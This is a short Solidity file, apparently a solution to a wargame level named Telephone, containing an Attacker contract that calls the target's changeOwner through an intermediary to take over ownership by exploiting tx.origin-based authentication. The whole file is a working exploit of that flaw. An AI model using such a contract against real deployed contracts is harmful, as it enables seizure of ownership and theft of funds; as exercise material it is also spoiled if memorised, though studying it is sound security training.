// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Attacker {
    ITelephone itelephone;
    constructor(address _telephone) {
        itelephone = ITelephone(_telephone);
    }

    function changeOwnerAttack() public {
        itelephone.changeOwner(msg.sender);
    }
}